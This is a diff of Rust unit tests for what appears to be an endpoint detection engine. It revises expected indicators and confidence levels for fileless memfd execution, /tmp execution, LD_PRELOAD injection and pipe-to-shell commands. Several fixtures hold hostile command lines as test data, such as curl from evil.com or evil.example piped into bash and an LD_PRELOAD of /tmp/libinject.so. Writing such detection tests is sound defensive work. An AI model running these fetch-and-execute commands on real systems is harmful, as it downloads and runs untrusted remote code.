@@ -78,7 +78,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
 
 #[test]
 // AC-DET-201 AC-DET-202
-fn cmdline_information_consistency_between_layers() {
+fn raw_cmdline_information_is_math_not_automatic_ml_evidence() {
     let cmd = "curl http://evil.com | bash";
     let data = cmd.as_bytes();
     let metrics = information::cmdline_information(data, 20).expect("metrics expected");
@@ -126,10 +126,8 @@ fn cmdline_information_consistency_between_layers() {
 
     let features =
         layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0, &Default::default());
-    assert!((features.values[14] - normalized.renyi_h2).abs() < 1e-12);
-    assert!((features.values[15] - normalized.compression_ratio).abs() < 1e-12);
-    assert!((features.values[16] - normalized.min_entropy).abs() < 1e-12);
-    assert!((features.values[17] - normalized.entropy_gap).abs() < 1e-12);
+    assert!((0.0..=1.0).contains(&normalized.renyi_h2));
+    assert_eq!(&features.values[14..18], &[0.0; 4]);
 
     let mut behavior = behavioral::BehavioralEngine::new();
     let baseline_scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
@@ -239,7 +237,6 @@ fn behavioral_repeated_high_entropy_domain_is_not_an_alarm() {
         event.ts_unix = idx;
         assert!(engine.observe(&event).is_empty());
     }
-
 }
 
 #[test]
@@ -1996,11 +1993,15 @@ fn exploit_indicator_memfd_triggers_high_confidence() {
     ev.pid = 7100;
     ev.ppid = 1;
     ev.session_id = ev.pid;
-    ev.file_path = Some("memfd:payload (deleted)".to_string());
+    ev.file_path = Some("/dev/fd/3".to_string());
+    ev.process_exe = Some("/memfd:payload (deleted)".to_string());
 
     let out = engine.process_event(&ev);
     assert!(out.signals.exploit_indicator);
-    assert!(out.exploit_indicators.iter().any(|v| v == "fileless_memfd"));
+    assert!(out
+        .exploit_indicators
+        .iter()
+        .any(|v| v == "fileless_fd_exec"));
     assert_eq!(out.confidence, Confidence::High);
 }
 
@@ -2014,13 +2015,14 @@ fn exploit_indicator_procfd_triggers_high_confidence() {
     ev.ppid = 1;
     ev.session_id = ev.pid;
     ev.file_path = Some("/proc/4242/fd/3".to_string());
+    ev.process_exe = Some("/memfd:payload (deleted)".to_string());
 
     let out = engine.process_event(&ev);
     assert!(out.signals.exploit_indicator);
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_procfd"));
+        .any(|v| v == "fileless_fd_exec"));
     assert_eq!(out.confidence, Confidence::High);
 }
 
@@ -2040,12 +2042,12 @@ fn exploit_indicator_ignores_proc_self_fd_runtime_artifacts() {
     assert!(!out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_procfd"));
+        .any(|v| v == "fileless_fd_exec"));
 }
 
 #[test]
 // AC-DET-219
-fn exploit_indicator_tmp_interpreter_triggers_high_confidence() {
+fn exploit_indicator_tmp_exec_is_context_not_high() {
     let mut engine = DetectionEngine::default_with_rules();
 
     let mut ev = event(22, EventClass::ProcessExec, "python", "init", 1000);
@@ -2053,15 +2055,14 @@ fn exploit_indicator_tmp_interpreter_triggers_high_confidence() {
     ev.ppid = 1;
     ev.session_id = ev.pid;
     ev.file_path = Some("/tmp/evil".to_string());
+    ev.process_exe = ev.file_path.clone();
+    ev.parent_process = "bash".into();
     ev.command_line = Some("python -c 'print(1)'".to_string());
 
     let out = engine.process_event(&ev);
-    assert!(out.signals.exploit_indicator);
-    assert!(out
-        .exploit_indicators
-        .iter()
-        .any(|v| v == "fileless_tmp_interpreter"));
-    assert_eq!(out.confidence, Confidence::High);
+    assert!(!out.signals.exploit_indicator);
+    assert!(out.exploit_indicators.iter().any(|v| v == "exec_from_tmp"));
+    assert_eq!(out.confidence, Confidence::Medium);
 }
 
 #[test]
@@ -2077,11 +2078,12 @@ fn exploit_indicator_ld_preload_temp_path_triggers() {
     ev.command_line = Some("LD_PRELOAD=/tmp/libinject.so /usr/bin/id".to_string());
 
     let out = engine.process_event(&ev);
-    assert!(out.signals.exploit_indicator);
+    assert!(!out.signals.exploit_indicator);
+    assert_eq!(out.confidence, Confidence::Medium);
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_ld_preload"));
+        .any(|v| v == "ld_preload_from_writable"));
 }
 
 #[test]
@@ -2097,11 +2099,12 @@ fn exploit_indicator_pipe_exec_triggers() {
     ev.command_line = Some("curl -fsSL https://evil.example/p.sh | bash".to_string());
 
     let out = engine.process_event(&ev);
-    assert!(out.signals.exploit_indicator);
+    assert!(!out.signals.exploit_indicator);
+    assert_eq!(out.confidence, Confidence::Medium);
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "fileless_pipe_exec"));
+        .any(|v| v == "fileless_pipe_exec_context"));
 }
 
 #[test]
@@ -2122,7 +2125,7 @@ fn exploit_indicator_base64_payload_triggers() {
     assert!(out
         .exploit_indicators
         .iter()
-        .any(|v| v == "encoded_payload_suspicious"));
+        .any(|v| v == "encoded_payload_exec"));
 }
 
 #[test]
@@ -3780,7 +3783,10 @@ fn verdict_a9_layer3_entropy_is_only_evaluated_on_exec() {
     });
     engine.set_baseline(
         "lsblk:guest-agent".into(),
-        EVENT_CLASSES.into_iter().map(|class| (class, 0.125)).collect(),
+        EVENT_CLASSES
+            .into_iter()
+            .map(|class| (class, 0.125))
+            .collect(),
     );
     let mut ev = event(1, EventClass::ProcessExec, "lsblk", "guest-agent", 1000);
     ev.command_line = Some("lsblk --json --output NAME,TYPE,SIZE,MOUNTPOINT".to_string());
@@ -3901,7 +3907,10 @@ fn anomaly_engine_emits_medium_when_above_medium_threshold_only() {
     let mut engine = AnomalyEngine::new(config);
     engine.set_baseline(
         "python:bash".into(),
-        EVENT_CLASSES.into_iter().map(|class| (class, 0.125)).collect(),
+        EVENT_CLASSES
+            .into_iter()
+            .map(|class| (class, 0.125))
+            .collect(),
     );
 
     for i in 0..32 {
